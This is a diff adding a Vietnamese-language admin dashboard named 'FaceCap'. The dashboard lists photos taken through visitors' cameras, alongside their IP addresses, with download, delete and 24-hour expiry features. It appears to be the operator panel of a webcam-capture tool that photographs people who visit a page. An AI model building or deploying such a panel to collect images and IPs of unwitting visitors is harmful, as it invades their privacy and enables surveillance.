@@ -1,0 +1,554 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Admin Dashboard — Quản lý ảnh</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&display=swap" rel="stylesheet"/>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --bg: #07090f;
+      --surface: #0f1220;
+      --surface2: #141828;
+      --border: rgba(255,255,255,0.07);
+      --accent: #6c63ff;
+      --accent-dim: rgba(108,99,255,0.15);
+      --danger: #f72585;
+      --danger-dim: rgba(247,37,133,0.12);
+      --success: #00e5a0;
+      --text: #eef0f8;
+      --muted: rgba(238,240,248,0.45);
+      --card-radius: 18px;
+    }
+
+    body {
+      font-family: 'Outfit', sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      min-height: 100vh;
+    }
+
+    /* ---- Sidebar ---- */
+    .sidebar {
+      position: fixed;
+      left: 0; top: 0; bottom: 0;
+      width: 240px;
+      background: var(--surface);
+      border-right: 1px solid var(--border);
+      padding: 32px 20px;
+      display: flex;
+      flex-direction: column;
+      gap: 8px;
+      z-index: 100;
+    }
+
+    .logo {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 0 8px;
+      margin-bottom: 32px;
+    }
+    .logo-icon {
+      width: 40px; height: 40px;
+      background: linear-gradient(135deg, var(--accent), var(--danger));
+      border-radius: 12px;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 1.2rem;
+    }
+    .logo-text { font-size: 1.05rem; font-weight: 700; }
+    .logo-sub  { font-size: 0.72rem; color: var(--muted); }
+
+    .nav-item {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 11px 14px;
+      border-radius: 12px;
+      font-size: 0.9rem;
+      font-weight: 500;
+      color: var(--muted);
+      cursor: pointer;
+      transition: all 0.2s ease;
+      border: 1px solid transparent;
+    }
+    .nav-item:hover { background: var(--accent-dim); color: var(--text); }
+    .nav-item.active { background: var(--accent-dim); color: #a89cff; border-color: rgba(108,99,255,0.25); }
+    .nav-icon { font-size: 1.1rem; }
+
+    .sidebar-footer {
+      margin-top: auto;
+      padding: 14px;
+      background: var(--danger-dim);
+      border: 1px solid rgba(247,37,133,0.2);
+      border-radius: 14px;
+      font-size: 0.8rem;
+      color: rgba(247,37,133,0.8);
+      line-height: 1.5;
+    }
+
+    /* ---- Main ---- */
+    .main {
+      margin-left: 240px;
+      padding: 36px 36px 60px;
+      min-height: 100vh;
+    }
+
+    /* ---- Header ---- */
+    .header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 32px;
+    }
+    .header-title { font-size: 1.6rem; font-weight: 700; }
+    .header-sub   { font-size: 0.9rem; color: var(--muted); margin-top: 2px; }
+
+    .refresh-btn {
+      display: flex; align-items: center; gap: 8px;
+      background: var(--surface2);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 10px 18px;
+      font-size: 0.88rem;
+      font-weight: 600;
+      color: var(--text);
+      cursor: pointer;
+      transition: all 0.2s;
+      font-family: 'Outfit', sans-serif;
+    }
+    .refresh-btn:hover { background: var(--accent-dim); border-color: rgba(108,99,255,0.3); }
+
+    /* ---- Stats ---- */
+    .stats-row {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+      gap: 16px;
+      margin-bottom: 32px;
+    }
+    .stat-card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--card-radius);
+      padding: 22px 20px;
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+      transition: border-color 0.2s;
+    }
+    .stat-card:hover { border-color: rgba(108,99,255,0.3); }
+    .stat-icon { font-size: 1.5rem; }
+    .stat-val  { font-size: 2rem; font-weight: 700; line-height: 1; }
+    .stat-label { font-size: 0.8rem; color: var(--muted); }
+
+    /* ---- Gallery ---- */
+    .section-title {
+      font-size: 1.1rem;
+      font-weight: 600;
+      margin-bottom: 20px;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+    }
+    .section-title::after {
+      content: '';
+      flex: 1;
+      height: 1px;
+      background: var(--border);
+    }
+
+    .empty-state {
+      text-align: center;
+      padding: 80px 20px;
+      color: var(--muted);
+    }
+    .empty-state .empty-icon { font-size: 4rem; margin-bottom: 16px; display: block; }
+    .empty-state h3 { font-size: 1.1rem; font-weight: 600; margin-bottom: 8px; color: var(--text); }
+
+    /* ---- Photo Grid ---- */
+    .photo-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+      gap: 20px;
+    }
+
+    .photo-card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--card-radius);
+      overflow: hidden;
+      transition: transform 0.25s ease, box-shadow 0.25s ease, border-color 0.25s ease;
+      animation: cardIn 0.4s ease both;
+    }
+    .photo-card:hover {
+      transform: translateY(-4px);
+      box-shadow: 0 16px 48px rgba(0,0,0,0.4);
+      border-color: rgba(108,99,255,0.3);
+    }
+    @keyframes cardIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+
+    .photo-thumb {
+      width: 100%;
+      aspect-ratio: 4/3;
+      object-fit: cover;
+      display: block;
+      cursor: pointer;
+      transition: transform 0.3s ease;
+    }
+    .photo-card:hover .photo-thumb { transform: scale(1.03); }
+
+    .photo-info {
+      padding: 16px;
+    }
+    .photo-meta {
+      display: flex;
+      flex-direction: column;
+      gap: 6px;
+      margin-bottom: 14px;
+    }
+    .meta-row {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 0.8rem;
+      color: var(--muted);
+    }
+    .meta-row strong { color: var(--text); font-weight: 500; }
+    .meta-icon { width: 16px; text-align: center; flex-shrink: 0; }
+
+    .timer-bar-wrap {
+      height: 4px;
+      background: rgba(255,255,255,0.06);
+      border-radius: 99px;
+      overflow: hidden;
+      margin-bottom: 14px;
+    }
+    .timer-bar {
+      height: 100%;
+      border-radius: 99px;
+      background: linear-gradient(90deg, var(--success), #00b4ff);
+      transition: width 1s linear;
+    }
+    .timer-bar.low { background: linear-gradient(90deg, #ff9a3c, var(--danger)); }
+
+    .photo-actions {
+      display: grid;
+      grid-template-columns: 1fr auto;
+      gap: 10px;
+    }
+    .btn-download {
+      display: flex; align-items: center; justify-content: center; gap: 8px;
+      background: var(--accent-dim);
+      border: 1px solid rgba(108,99,255,0.3);
+      border-radius: 10px;
+      padding: 10px;
+      font-size: 0.85rem;
+      font-weight: 600;
+      color: #a89cff;
+      cursor: pointer;
+      transition: all 0.2s;
+      text-decoration: none;
+      font-family: 'Outfit', sans-serif;
+    }
+    .btn-download:hover { background: rgba(108,99,255,0.25); transform: scale(1.02); }
+
+    .btn-delete {
+      display: flex; align-items: center; justify-content: center;
+      background: var(--danger-dim);
+      border: 1px solid rgba(247,37,133,0.25);
+      border-radius: 10px;
+      padding: 10px 14px;
+      font-size: 1.1rem;
+      cursor: pointer;
+      transition: all 0.2s;
+    }
+    .btn-delete:hover { background: rgba(247,37,133,0.22); transform: scale(1.05); }
+
+    /* ---- Lightbox ---- */
+    .lightbox {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.92);
+      z-index: 999;
+      align-items: center;
+      justify-content: center;
+      backdrop-filter: blur(8px);
+    }
+    .lightbox.open { display: flex; }
+    .lightbox img {
+      max-width: 90vw;
+      max-height: 85vh;
+      border-radius: 16px;
+      box-shadow: 0 32px 80px rgba(0,0,0,0.8);
+    }
+    .lb-close {
+      position: fixed;
+      top: 20px; right: 24px;
+      font-size: 1.8rem;
+      cursor: pointer;
+      color: rgba(255,255,255,0.7);
+      transition: color 0.2s;
+      background: none; border: none;
+      z-index: 1000;
+    }
+    .lb-close:hover { color: #fff; }
+
+    /* ---- Scrollbar ---- */
+    ::-webkit-scrollbar { width: 6px; }
+    ::-webkit-scrollbar-track { background: transparent; }
+    ::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.1); border-radius: 99px; }
+
+    /* ---- Loading ---- */
+    .loading-state {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 80px;
+      gap: 14px;
+      color: var(--muted);
+    }
+    .spinner {
+      width: 28px; height: 28px;
+      border: 3px solid rgba(108,99,255,0.2);
+      border-top-color: var(--accent);
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+
+    @media (max-width: 768px) {
+      .sidebar { width: 64px; padding: 20px 10px; }
+      .logo-text, .logo-sub, .nav-label, .sidebar-footer { display: none; }
+      .logo { justify-content: center; }
+      .main { margin-left: 64px; padding: 20px 16px; }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Sidebar -->
+  <nav class="sidebar">
+    <div class="logo">
+      <div class="logo-icon">📸</div>
+      <div>
+        <div class="logo-text">FaceCap</div>
+        <div class="logo-sub">Admin Panel</div>
+      </div>
+    </div>
+
+    <div class="nav-item active">
+      <span class="nav-icon">🖼️</span>
+      <span class="nav-label">Thư viện ảnh</span>
+    </div>
+    <div class="nav-item" onclick="loadPhotos()">
+      <span class="nav-icon">🔄</span>
+      <span class="nav-label">Làm mới</span>
+    </div>
+
+    <div class="sidebar-footer">
+      ⏰ Ảnh tự xóa sau <strong>24 giờ</strong> kể từ khi được chụp.
+    </div>
+  </nav>
+
+  <!-- Main -->
+  <main class="main">
+    <div class="header">
+      <div>
+        <div class="header-title">📸 Thư Viện Ảnh</div>
+        <div class="header-sub" id="last-updated">Đang tải...</div>
+      </div>
+      <button class="refresh-btn" onclick="loadPhotos()">
+        🔄 Làm mới
+      </button>
+    </div>
+
+    <!-- Stats -->
+    <div class="stats-row">
+      <div class="stat-card">
+        <span class="stat-icon">📷</span>
+        <span class="stat-val" id="stat-total">0</span>
+        <span class="stat-label">Tổng ảnh</span>
+      </div>
+      <div class="stat-card">
+        <span class="stat-icon">⏳</span>
+        <span class="stat-val" id="stat-expiring">0</span>
+        <span class="stat-label">Sắp hết hạn (&lt; 2h)</span>
+      </div>
+      <div class="stat-card">
+        <span class="stat-icon">🕐</span>
+        <span class="stat-val" id="stat-today">0</span>
+        <span class="stat-label">Hôm nay</span>
+      </div>
+    </div>
+
+    <!-- Gallery -->
+    <div class="section-title">Tất cả ảnh</div>
+    <div id="gallery">
+      <div class="loading-state">
+        <div class="spinner"></div>
+        <span>Đang tải ảnh...</span>
+      </div>
+    </div>
+  </main>
+
+  <!-- Lightbox -->
+  <div class="lightbox" id="lightbox" onclick="closeLightbox()">
+    <button class="lb-close" onclick="closeLightbox()">✕</button>
+    <img id="lb-img" src="" alt="Preview" onclick="event.stopPropagation()" />
+  </div>
+
+  <script>
+    let photos = [];
+
+    function formatDate(iso) {
+      const d = new Date(iso);
+      return d.toLocaleString('vi-VN', { dateStyle: 'short', timeStyle: 'medium' });
+    }
+
+    function formatTimeLeft(ms) {
+      if (ms <= 0) return 'Đã hết hạn';
+      const h = Math.floor(ms / 3600000);
+      const m = Math.floor((ms % 3600000) / 60000);
+      if (h > 0) return `${h}h ${m}m còn lại`;
+      return `${m} phút còn lại`;
+    }
+
+    function formatSize(bytes) {
+      if (!bytes) return '';
+      return (bytes / 1024).toFixed(1) + ' KB';
+    }
+
+    async function loadPhotos() {
+      document.getElementById('last-updated').textContent = 'Đang cập nhật...';
+      try {
+        const res = await fetch('/api/photos');
+        photos = await res.json();
+        renderGallery();
+        updateStats();
+        document.getElementById('last-updated').textContent =
+          `Cập nhật lúc ${new Date().toLocaleTimeString('vi-VN')} — ${photos.length} ảnh`;
+      } catch(e) {
+        document.getElementById('gallery').innerHTML =
+          '<div class="loading-state">❌ Lỗi kết nối server</div>';
+      }
+    }
+
+    function updateStats() {
+      document.getElementById('stat-total').textContent = photos.length;
+
+      const expiring = photos.filter(p => p.timeLeft < 2 * 3600 * 1000 && p.timeLeft > 0).length;
+      document.getElementById('stat-expiring').textContent = expiring;
+
+      const today = new Date();
+      const todayCount = photos.filter(p => {
+        const d = new Date(p.uploadedAt);
+        return d.toDateString() === today.toDateString();
+      }).length;
+      document.getElementById('stat-today').textContent = todayCount;
+    }
+
+    function renderGallery() {
+      const gallery = document.getElementById('gallery');
+
+      if (photos.length === 0) {
+        gallery.innerHTML = `
+          <div class="empty-state">
+            <span class="empty-icon">📭</span>
+            <h3>Chưa có ảnh nào</h3>
+            <p>Khi người dùng truy cập trang và cho phép camera,<br>ảnh sẽ xuất hiện ở đây.</p>
+          </div>`;
+        return;
+      }
+
+      gallery.innerHTML = `<div class="photo-grid">${photos.map(renderCard).join('')}</div>`;
+    }
+
+    function renderCard(photo) {
+      const timeLeft = photo.timeLeft;
+      const pct = Math.min(100, Math.max(0, (timeLeft / (24*3600*1000)) * 100));
+      const isLow = pct < 20;
+      const ip = photo.ip || 'Ẩn danh';
+      const cleanIP = ip.replace('::ffff:','').replace('::1','Localhost');
+
+      return `
+        <div class="photo-card" id="card-${photo.filename}">
+          <img
+            class="photo-thumb"
+            src="${photo.url}"
+            alt="Capture"
+            onclick="openLightbox('${photo.url}')"
+            loading="lazy"
+          />
+          <div class="photo-info">
+            <div class="photo-meta">
+              <div class="meta-row">
+                <span class="meta-icon">📅</span>
+                <strong>${formatDate(photo.uploadedAt)}</strong>
+              </div>
+              <div class="meta-row">
+                <span class="meta-icon">🌐</span>
+                <span>${cleanIP}</span>
+              </div>
+              <div class="meta-row">
+                <span class="meta-icon">⏰</span>
+                <span style="color:${isLow ? '#f72585' : 'inherit'}">${formatTimeLeft(timeLeft)}</span>
+              </div>
+              ${photo.size ? `<div class="meta-row"><span class="meta-icon">📦</span><span>${formatSize(photo.size)}</span></div>` : ''}
+            </div>
+
+            <div class="timer-bar-wrap">
+              <div class="timer-bar ${isLow ? 'low' : ''}" style="width:${pct}%"></div>
+            </div>
+
+            <div class="photo-actions">
+              <a class="btn-download" href="${photo.url}" download="${photo.filename}">
+                ⬇️ Tải về
+              </a>
+              <button class="btn-delete" onclick="deletePhoto('${photo.filename}')" title="Xóa">
+                🗑️
+              </button>
+            </div>
+          </div>
+        </div>`;
+    }
+
+    async function deletePhoto(filename) {
+      if (!confirm('Xóa ảnh này?')) return;
+      try {
+        await fetch(`/api/photos/${filename}`, { method: 'DELETE' });
+        photos = photos.filter(p => p.filename !== filename);
+        const card = document.getElementById(`card-${filename}`);
+        if (card) {
+          card.style.animation = 'none';
+          card.style.transform = 'scale(0.85)';
+          card.style.opacity = '0';
+          card.style.transition = 'all 0.3s ease';
+          setTimeout(() => { card.remove(); updateStats(); }, 300);
+        }
+      } catch(e) {
+        alert('Lỗi khi xóa ảnh!');
+      }
+    }
+
+    function openLightbox(url) {
+      document.getElementById('lb-img').src = url;
+      document.getElementById('lightbox').classList.add('open');
+    }
+    function closeLightbox() {
+      document.getElementById('lightbox').classList.remove('open');
+    }
+    document.addEventListener('keydown', e => { if (e.key === 'Escape') closeLightbox(); });
+
+    // Auto refresh mỗi 15 giây
+    loadPhotos();
+    setInterval(loadPhotos, 15000);
+  </script>
+</body>
+</html>
